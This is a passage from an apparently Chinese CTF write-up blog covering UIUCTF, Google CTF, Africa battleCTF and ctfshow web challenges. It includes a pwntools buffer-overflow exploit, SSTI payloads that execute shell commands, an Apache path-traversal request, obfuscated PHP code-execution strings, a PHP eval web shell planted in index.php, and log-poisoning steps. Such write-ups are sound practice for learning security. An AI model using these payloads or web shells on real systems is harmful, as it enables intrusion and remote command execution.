b)])# To store the final keyfinal_key = [None]*150# To store the positions we know are brokenknown_key_positions = set()# For each ciphertextfor current_index, ciphertext in enumerate(ciphers): counter = collections.Counter() # for each other ciphertext for index, ciphertext2 in enumerate(ciphers): if current_index != index: # don&#x27;t xor a ciphertext with itself for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): # Xor the two ciphertexts # If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one) if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index knownSpaceIndexes = [] # Loop through all positions where a space character was possible in the current_index cipher for ind, val in counter.items(): # If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher! if val &gt;= 7: knownSpaceIndexes.append(ind) #print knownSpaceIndexes # Shows all the positions where we now know the key! # Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back! xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150) for index in knownSpaceIndexes: # Store the key&#x27;s value at the correct position final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;) # Record that we known the key at this position known_key_positions.add(index)# Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key])# Xor the currently known key with the target cipheroutput = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;))print &quot;Fix this sentence:&quot;print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\\n&quot;# WAIT.. MANUAL STEP HERE # This output are printing a * if that character is not known yet# fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;# if is too hard, change the target_cipher to another one and try again# and we have our key to fix the entire text!#sys.exit(0) #comment and continue if u got a good keytarget_plaintext = &quot;printed on flammable material so that spies could&quot;print &quot;Fixed:&quot;print target_plaintext+&quot;\\n&quot;key = strxor(target_cipher.decode(&#x27;hex&#x27;),target_plaintext)print &quot;Decrypted msg:&quot;for cipher in ciphers: print strxor(cipher.decode(&#x27;hex&#x27;),key)print &quot;\\nPrivate key recovered: &quot;+key+&quot;\\n&quot; 运行得到flag At Home12345678910111213141516171819202122#chal.pyfrom Crypto.Util.number import getRandomNBitIntegerflag = int.from_bytes(b&quot;uiuctf&#123;******************&#125;&quot;, &quot;big&quot;)a = getRandomNBitInteger(256)b = getRandomNBitInteger(256)a_ = getRandomNBitInteger(256)b_ = getRandomNBitInteger(256)M = a * b - 1e = a_ * M + ad = b_ * M + bn = (e * d - 1) // Mc = (flag * e) % nprint(f&quot;&#123;e = &#125;&quot;)print(f&quot;&#123;n = &#125;&quot;)print(f&quot;&#123;c = &#125;&quot;) 123e = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713n = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689c = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869 通过c=(flag*e)%n可得 123c = (flag * e) % nc * e^-1 = (flag * e * e^-1) % nc * e^-1 = flag % n 1234567from Crypto.Util.number import *e = 359050389152821553416139581503505347057925208560451864426634100333116560422313639260283981496824920089789497818520105189684311823250795520058111763310428202654439351922361722731557743640799254622423104811120692862884666323623693713n = 26866112476805004406608209986673337296216833710860089901238432952384811714684404001885354052039112340209557226256650661186843726925958125334974412111471244462419577294051744141817411512295364953687829707132828973068538495834511391553765427956458757286710053986810998890293154443240352924460801124219510584689c = 67743374462448582107440168513687520434594529331821740737396116407928111043815084665002104196754020530469360539253323738935708414363005373458782041955450278954348306401542374309788938720659206881893349940765268153223129964864641817170395527170138553388816095842842667443210645457879043383345869d=inverse(e,n)flag=(c*d)%nprint(long_to_bytes(flag)) PWNChainmail一个基础的栈溢出，跳到give_flag的函数即可，但要注意的是在发送give_flag的地址之前要再给他发送一个ret的地址，否则会造成错误的对齐。ret的地址可以用ROPgadget 找，命令:ROPgadget --binary chal --only &#39;ret&#39;。 exp： 12345from pwn import *a = remote(&quot;chainmail.chal.uiuc.tf&quot;, 1337)payload=b&#x27;a&#x27;*72 +p64(0x40101a) + p64(0x401216)a.sendline(payload)a.interactive() WEBpeanut-xssXSS学的不是很好，具体怎么解可以看下面的文章: https://hackmd.io/@Solderet/UIUCTF-2023-peanut-xss","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"Google-CTF2023","slug":"Google-CTF2023","date":"2023-06-29T10:32:01.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/06/29/Google-CTF2023/","permalink":"https://lvzhouhang.xyz/2023/06/29/Google-CTF2023/","excerpt":"","text":"MISCPAPAPAPA下载下来附件是一张全白的图片，通过修改jpg的宽高获得flag 从FF到01中间，修改成FF C0 00 11 08 02 00 02 10 03 01 31 00 02 31 01 03 31 01 右边就是flag WEBUNDER-CONSTRUCTION给了一个flask和一个php的服务，没有办法ssti注入 123456789101112131415161718192021222324252627function getResponse()&#123; if (!isset($_POST[&#x27;username&#x27;]) || !isset($_POST[&#x27;password&#x27;])) &#123; return NULL; &#125; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; if (!is_string($username) || !is_string($password)) &#123; return &quot;Please provide username and password as string&quot;; &#125; $tier = getUserTier($username, $password); if ($tier === NULL) &#123; return &quot;Invalid credentials&quot;; &#125; $response = &quot;Login successful. Welcome &quot; . htmlspecialchars($username) . &quot;.&quot;; if ($tier === &quot;gold&quot;) &#123; $response .= &quot; &quot; . getenv(&quot;FLAG&quot;); &#125; return $response;&#125; 通过代码分析，在php的服务上，只要让tier=gold就输出flag。 可以在注册账号的时候传两个tier。 flask识别第一个tier，php识别第二个tier，注册完后在php服务登录得到falg。 其他的太难了，看都看不懂 http://blog.xmcve.com/2023/06/26/Google-CTF-2023-Writeup/ 可以看这个","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"复盘","slug":"ctf/复盘","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"Africa battle CTF","slug":"Africa-battle-CTF","date":"2023-06-26T00:29:04.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/06/26/Africa-battle-CTF/","permalink":"https://lvzhouhang.xyz/2023/06/26/Africa-battle-CTF/","excerpt":"","text":"WEBCivilization1234567891011121314&lt;?phprequire(&quot;./flag.php&quot;);if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); &#125;if(isset($_GET[&#x27;ami&#x27;]))&#123; $input = $_GET[&#x27;ami&#x27;]; $cigar = &#x27;africacradlecivilization&#x27;; if (preg_replace(&quot;/$cigar/&quot;,&#x27;&#x27;,$input) === $cigar) &#123; africa(); &#125;&#125;include(&quot;home.html&quot;);?&gt; ?source得到这个，这个只用双写就可以绕过。 payload: 1?ami=africacradlecafricacradlecivilizationivilization Cobalt Injection在源代码里有 &lt;!-- IP?capital=Benin --&gt; 可知存在ssti模板注入。没有过滤。 payload: 1?capital=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat flag.txt&#x27;).read()&#125;&#125; 当然看别人的WP，要长脑子了 1?capital=&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&#125;&#125; #request.application：表示当前请求的应用程序对象。 1?capital=&#123;&#123;().__class__.__base__.__subclasses__()[354](&#x27;cat flag.txt&#x27;, shell=True, stdout=-1).communicate()[0].strip()&#125;&#125; 这个还没搞明白，搞明白了再回来修改。 Fâ访问?source 1234567891011121314151617181920212223242526272829&lt;?php include(&quot;flag.php&quot;); if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); &#125; class africa &#123; var $boknn; var $du; &#125; if (isset($_GET[&#x27;fa&#x27;])) &#123; $vodoo = $_GET[&#x27;fa&#x27;]; $fa = unserialize($vodoo); if ($fa) &#123; $fa-&gt;du=$flag; if ($fa-&gt;du === $fa-&gt;boknn) echo &quot;Congratulation! You&#x27;ve got the best interpretation: &lt;b&gt;&quot;.$fa-&gt;du.&quot;&lt;/b&gt;&quot;; else echo &quot;Oh no...&quot;; &#125; else echo &quot;you dey smoke igbo?&quot;; &#125; include(&quot;home.html&quot;);?&gt; 反序列化，只要将传入的fa值和$du相等就可以输出flag。 payload: 1?fa=O:6:&quot;africa&quot;:2:&#123;s:5:&quot;boknn&quot;;N;s:2:&quot;du&quot;;R:2;&#125; 其中，boknn的值为NULL，du的值通过R引用了编号为2的值， boknn的编号就为2。 具体的可以看:https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html Own reality真是让我长见识了。 首先是.git泄露 用wget将网站下载下来 `wget http://chall.battlectf.online:8082/.git/ -mirror 使用 --mirror 选项你可以下载整个站点，包括它的目录结构。 然后用git reflog查看历史版本，之后用git cherry-pick ‘你想要恢复的’ 会出来一个flag.txt,尾部有 1.__..._..__...._.___._...___._...__.__...__.._._._....__._._._..._...__..____.__._._._._.__.___..__._.__.__.___..__.____.___.___.__.___.._._____.__..._..__._.._.___._...___..__._._____..__..__..___.....__._...__.._._.__.._._.__...._..__._....___.._.__..._...__._....__..._..__.___.__.._._.__.._._..__.._..__..__..__..__...__._._.__...._..__..._..__..__.__..__..__..._..__.._...__...__.__...__.__...._..__.__..__..__...__..__..__.._...__.___._____._ 二进制转换为字符就是flag It shock you先用whatweb看网站， 可以看到apache的版本，去网上找相对应的漏洞能找到，目录穿越 POC: 1234567891011121314GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/flag.txt HTTP/1.1Host: chall.battlectf.online:8083User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: closeCookie: PHPSESSID=6ae53a7d294917d5fdac2db41c97b477Upgrade-Insecure-Requests: 1If-Modified-Since: Tue, 06 Jun 2023 14:53:49 GMTIf-None-Match: &quot;b6d-5fd772fd55940&quot; AfricaWarning: This site is only for africa people. 在bp中将User-Agent改为africa Warning: Go away! Attacker! This page is only for local client! 用X-Forwarded-For伪造127.0.0.1 Warning: I don&#39;t trust users who are not from battlectf.online 用Referer绕过得到flag。 CryptoBack To Origin埃及象形文 https://girlstart.org/wp-content/uploads/2020/05/Decoding-Hieroglyphics.pdf 可以参考上面的链接 Blindhttps://gchq.github.io/CyberChef/ 首先是magic解码，然后 braille,解码得到flag ROCYOUfactordb和yafu分解不出来，看别人的博客知道有ROCA漏洞，可以从公钥中提取私钥 工具： https://gitlab.com/parfaittolefo23/astuces-et-write-up-ctf/-/blob/main/Tools/neca 一开始运行要给权限 可以用在线的rsa解密工具：https://www.dcode.fr/chiffre-rsa 12p=127801155916875524149457561567678575565270601000365665873572024750823913157383q=113917064871970833547038329106470040388258358281464605006613652518914797349747 goose首先给了5个随机数，然后将falg的每个字符通过res = (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)进行加密。 flag的前几个字符是知道的，可以列方程组计算一下a,b,c,d,e的值 123456184473632*a+941192*b+9604*c+98*d+1*e=1245115057305148164177058562*a+912673*b+9409*c+97*d+1*e=1195140205147730541362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988362127872*a+1560896*b+13456*c+116*d+1*e=2441940832124642988272097792*a+1259712*b+11664*c+108*d+1*e=1835524676869638124208120802*a+1030301*b+10201*c+101*d+1*e=1404473868033353193 解得： 12345a=6709636436b=7748795321c=7386429784d=62359624e=5008041292 然后写代码爆破: 12345678910111213141516flag = &#x27;&#x27;a=6709636436b=7748795321c=7386429784d=62359624e=5008041292tab=[1245115057305148164, 1195140205147730541, 2441940832124642988, 2441940832124642988, 1835524676869638124, 1404473868033353193, 272777109172255911, 672752034376118188, 324890781330979572, 3086023531811583439, 475309634185807521, 1195140205147730541, 2441940832124642988, 1578661367846445708, 2358921859155462327, 1099718459319293547, 773945458916291731, 78288818574073053, 2441940832124642988, 1578661367846445708, 1099718459319293547, 343816904985468003, 1195140205147730541, 2527132076695959961, 2358921859155462327, 2358921859155462327, 1099718459319293547, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 72109063929756364, 2796116718132693772, 3291439457645322417]def encrypt(x): return (2*a*pow(ord(x),4)+b*pow(ord(x),3)+c*pow(ord(x),2)+d*ord(x)+e)for val in tab: for i in range(32,126): if(encrypt(chr(i))==val): flag+=chr(i) print(flag) REseyiida64位打开,flag在getshell里面。 welcome 重点就是这个， add就是加， xor就是异或。 很简单的一个表达式。 12345678from Crypto.Util.number import *a = 0x522D1B20F6b = 0x1EE2EEEEc = a+bd = 0x0AA84AAAflag = c^dflag = long_to_bytes(flag)print(flag) Infinity 找到汇编代码里所有的push，然后将值转换一下 1234567891011from pwn import *a= [p64(0x5F4F7572), p64(0x6C654354), p64(0x467B4265), p64(0x796F6E64), p64(0x62617474), p64(0x47616C61), p64(0x7869657D)]for c in a: print(c) 1234567b&#x27;ruO_\\x00\\x00\\x00\\x00&#x27;b&#x27;TCel\\x00\\x00\\x00\\x00&#x27;b&#x27;eB&#123;F\\x00\\x00\\x00\\x00&#x27;b&#x27;dnoy\\x00\\x00\\x00\\x00&#x27;b&#x27;ttab\\x00\\x00\\x00\\x00&#x27;b&#x27;alaG\\x00\\x00\\x00\\x00&#x27;b&#x27;&#125;eix\\x00\\x00\\x00\\x00&#x27; 然后将这些反转一下删掉多余的东西 1234567_OurleCTF&#123;BebattGalaxie&#125;yond 最后将这些拼接一下，battleCTF&#123;Beyond_OurGalaxie&#125; 。 babyrev用ida打开，查询字符串能发现qpiiatRIU&#123;Pvqp_Ugt3_UDDS_Stn_d0D!_85864r1277qu8195pqqtp6540494pr46&#125;，然后凯撒解密得到flag checker和上一题基本上差不多 gfyyqjHYK&#123;Flg4_d0z_i3d_xr0p3_1lg0?&#125;然后凯撒解密","categories":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"复盘","slug":"ctf/复盘","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"}]},{"title":"ctfshow web入门126~150","slug":"ctfshow-web入门126","date":"2023-03-18T07:42:06.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/03/18/ctfshow-web入门126/","permalink":"https://lvzhouhang.xyz/2023/03/18/ctfshow-web%E5%85%A5%E9%97%A8126/","excerpt":"","text":"web126与web125差不多 12get: a=1+fl0g=flag_give_mepost: CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1]) web127绕过方式和web123一样。payload： 1?ctf show=ilove36d web128考察点：gettext拓展的使用在开启该拓展后 _() 等效于 gettext()payload: 1?f1=_&amp;f2=get_defined_vars web129 12stripos(string,find,start)返回值：返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回FALSE。注释：字符串位置从0开始，不是从1开始 看别人的wp绕过的姿势有很多啊，但是怎么一到我这里就失灵了啊。只能用php伪协议payload: 1?f=php://filter/|ctfshow/resource=flag.php #也可以用其他的过滤器 web130PHP利用PCRE回溯次数限制绕过某些安全限制 12345678import requestsurl=&#x27;#url&#x27;data=&#123; &#x27;f&#x27;:&#x27;a&#x27;*1000000+&#x27;ctfshow&#x27;&#125;r=requests.post(url=url,data=data).textprint(r) 或者数组绕过 1f[]=1 #stripos应用于数组的时候会返回null，null!==false 或者 1f=ctfshow /s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，总之就是ctfshow前面必须得有字符才能匹配到，所以直接f=ctfshow就可以了。 web13112345678import requestsurl=&#x27;#url&#x27;data=&#123; &#x27;f&#x27;:&#x27;a&#x27;*1000000+&#x27;36Dctfshow&#x27;&#125;r=requests.post(url=url,data=data).textprint(r) web132一打开网站我都惊呆了，好高级的感觉。然后访问robots.txt有/admin访问就能看到源码。啊~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~这一题好简单啊。 1$code === mt_rand(1,0x36D) &amp;&amp; $password === $flag 只要让这个为false，username=admin和code=admin就行payload： 1?username=admin&amp;code=admin&amp;password=1 web134parse_str()函数 1把查询字符解析到变量 ectract()函数 1从数组中将变量导入当前的符号表 1php变量覆盖 利用点是 extract($_POST); 进行解析$_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。 123456789101112131415四个变量的介绍：1.$_SERVER[&quot;QUERY_STRING&quot;]说明：查询(query)的字符串2.$_SERVER[&quot;REQUEST_URI&quot;]说明：访问此页面所需的URI 3.$_SERVER[&quot;SCRIPT_NAME&quot;]说明：包含当前脚本的路径 4.$_SERVER[&quot;PHP_SELF&quot;] 例如 123456789http://www.xxx.com/?p=222 (附带查询)结果：$_SERVER[&quot;QUERY_STRING&quot;]==&gt;“p=222”;$_SERVER[&quot;REQUEST_URI&quot;] ==&gt;&quot;/?p=222&quot;;$_SERVER[&quot;SCRIPT_NAME&quot;] ==&gt;&quot;/index.php&quot;;$_SERVER[&quot;PHP_SELF&quot;] ==&gt;&quot;/index.php&quot;; payload: 1?_POST[key1]=36d&amp;_POST[key2]=36d web136跟着大佬学到了好多啊在linux里可以用tee命令读取标准输入的数据，并将其内容输出成文件payload: 12?c=ls /|tee 1 #把根目录里的内容写进1文件里?c=tac /f149_15_h3r3|tee 2 web137 1call_user_func — 把第一个参数作为回调函数调用 考察调用类中的函数 123php中 -&gt;与:: 调用类中的成员的区别-&gt;用于动态语境处理某个类的某个实例::可以调用一个静态的、不依赖于其他初始化的类方法. payload: 1POST:ctfshow=ctfshow::getFlag web138相当于把冒号禁用了，但是call_user_func还可以传数组第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用。payload: 1POST:ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag web139太难了，脚本看不懂，以后有机会了再做 web140可以看到只要我们让intval($code)为0就可以了intval会将非数字字符转换为0，也就是说 intval(‘a’)==0 intval(‘.’)==0 intval(‘/‘)==0所以方法就挺多了payload： 1f1=chr&amp;f2=chr 我感觉随便搞一点函数放上去都可以。 web141传入的v3必须是非单词字符无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）payload： 1?v1=1&amp;v2=1&amp;v3=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)- web142emmmmmmmmmmmm，让我太奶来都会做payload: 1?v1=0 web143 1?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1 web144对v3的长度进行了限制,所以在v2上下手payload: 1?v1=1&amp;v2=-(%80%80%80%80%80%80^%F3%F9%F3%F4%E5%ED)(%80%80%80%80%80^%E3%E1%F4%A0%AA)&amp;v3=1 web145可以用三目运算符 1eval(&quot;return 1?phpinfo():1;&quot;); #这是可以运行的 payload: 1?v1=1&amp;v2=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5): web146过滤了：没办法用三目运算符，可以用等号和位运算符\\ 1eval(&quot;return 1==phpinfo()||1;&quot;); #这也可以运行 payload: 1?v1=1&amp;v2=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|| web147具体原理看这个 1234567create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)类似于function f($a) &#123; echo $a.&quot;123&quot;;&#125; payload: 12GET:?show=&#125;system(&quot;tac flag.php&quot;);/*POST:ctf=\\create_function web148没过滤异或还可以用异或payload: 1?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;); web149预期解是条件竞争，可是我搞了半天也不行，就直接在index.php里改了payload: 12GET: ?ctf=index.phpPOST: show=&lt;?php @eval($_POST[a];)?&gt; 然后用蚁剑连接。 web1501234567891011121314151617181920212223242526272829303132333435363738394041424344include(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip = 0; $this-&gt;secret = $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125;&#125;#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123; die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123; include($ctf);&#125; 非预期日志文件包含写一句话修改user_agent内容为一句话，然后包含/var/log/nginx/access.log就可以使用我们写的一句话了。首先访问index.php 修改user_agent为","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"刷题","slug":"ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"ctfshow/刷题/php特性","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"php特性","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow web入门110~125","slug":"ctfshow-web入门110","date":"2023-03-17T05:05:46.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/03/17/ctfshow-web入门110/","permalink":"https://lvzhouhang.xyz/2023/03/17/ctfshow-web%E5%85%A5%E9%97%A8110/","excerpt":"web110考察FilesystemIterator。getcwd()函数 获取当前工作目录 返回当前工作目录。payload: 1?v1=FilesystemIterator&amp;v2=getcwd 缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。","text":"web110考察FilesystemIterator。getcwd()函数 获取当前工作目录 返回当前工作目录。payload: 1?v1=FilesystemIterator&amp;v2=getcwd 缺陷是如果flag的文件不在第一位的话，就不能得到这个文件名。 web111考察 全局变量GLOBALS要执行这一段函数，v1要等于ctfshow 123if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123; getFlag($v1,$v2); &#125; 然后再将v2的值赋给v1，再接着getFlag函数，打印v1，v1为全局变量的时候，即可打印出flag。payload: 1?v1=ctfshow&amp;v2=GLOBALS web112payload: 1234php://filter/resource=flag.phpphp://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.phpphp://filter/read=convert.quoted-printable-encode/resource=flag.phpcompress.zlib://flag.php php://filter的各种过滤器 web113payload:可以用zlib伪协议 1?file=compress.zlib://flag.php 也可以用/proc/self/root 12345?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php proc目录的应用compress，和非预期都被禁了，但是伪协议放出来了，可以直接使用伪协议读payload: 1?file=php://filter/resource=flag.php web115考察点：trim函数的绕过+is_numeric绕过 12345678910111213语法trim(string,charlist)参数 描述string 必需。规定要检查的字符串。charlist 可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：&quot;\\0&quot; - NULL&quot;\\t&quot; - 制表符&quot;\\n&quot; - 换行&quot;\\x0B&quot; - 垂直制表符&quot;\\r&quot; - 回车&quot; &quot; - 空格 看师傅的wp才能做出来，在本地测试一下 12345678&lt;?phpfor($i=0;$i&lt;=128;$i++)&#123; $str=chr($i).&quot;1&quot;; if(is_numeric($str)&amp;&amp; trim($str)!==&#x27;1&#x27;)&#123; echo urlencode(chr($i)).&quot;&lt;br&gt;&quot;; &#125;&#125; 可以用%0c换页，payload: 1?num=%0c36 web123 1GET或POST的方式传进去的变量名，会自动将空格 + . [ 转换为_,想构造出.，需要前面带上[，后面用.就可以不变成_。 payload: 1POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=echo $flag web125 123456789101112131、cli模式（命令行）下 第一个参数$_SERVER[&#x27;argv&#x27;][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下 在web页模式下必须在php.ini开启register_argc_argv配置项 设置register_argc_argv = On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果 这时候的$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’] $argv,$argc在web模式下不适用 payload: 123payload:get: $fl0g=flag_give_me;post: CTF_SHOW=1&amp;CTF%5bSHOW.COM=1&amp;fun=eval($a[0])","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"刷题","slug":"ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"ctfshow/刷题/php特性","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"}],"tags":[{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"php特性","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"}]},{"title":"ctfshow web入门105~109","slug":"ctfshow-web入门105","date":"2023-02-26T11:25:50.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2023/02/26/ctfshow-web入门105/","permalink":"https://lvzhouhang.xyz/2023/02/26/ctfshow-web%E5%85%A5%E9%97%A8105/","excerpt":"1234foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; 这一段说get传的值不能等于error。 1234foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; 这一段说POST传的值不能等于flag。 123if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125; 这一段说POST传的值不等于flag的话输出变量error。payload: 12GET:?a=flagPOST:error=a","text":"1234foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; 这一段说get传的值不能等于error。 1234foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; 这一段说POST传的值不能等于flag。 123if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125; 这一段说POST传的值不等于flag的话输出变量error。payload: 12GET:?a=flagPOST:error=a web106这道题就比web105多一个比较。payload: 12GET:v2[]=1POST:v1[]=2 web107 1234parse_str(string,array)把查询字符串解析到变量中。string必选。规定要解析的字符串array可选。规定存储变量的数组的名称。 题目就是把v1的值赋给v2，然后让v2的值和v3的MD5值相同。payload: 12GET:?v3=aPOST:v1=flag=0cc175b9c0f1b6a831c399e269772661 MD5没办法处理数组。 12GET:?v3=aPOST:v1= #空 web108连接不到服务器….. 